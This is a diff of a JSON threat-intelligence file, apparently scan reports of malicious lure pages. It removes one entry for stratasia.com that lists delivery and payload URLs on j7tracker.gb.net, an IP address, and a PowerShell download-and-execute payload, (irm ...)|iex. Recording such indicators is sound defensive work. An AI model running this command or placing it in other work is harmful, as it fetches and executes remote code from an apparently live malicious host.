@@ -1314,24 +1314,5 @@
     ],
     "ReportId": "cmwvv889y0fph0nmlsrt9wspk",
     "ScannedAt": "2026-11-25T08:32:28.216000+00:00"
-  },
-  {
-    "UrlDomain": "stratasia.com",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/click/8d6a62fbc425bc67"
-    ],
-    "IP": [
-      "198.54.114.225"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/click/8d6a62fbc425bc67')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/click/8d6a62fbc425bc67"
-    ],
-    "ReportId": "cmwvnxzc10fac0nmlrhg9rp82",
-    "ScannedAt": "2026-11-25T05:08:32.722000+00:00"
   }
 ]
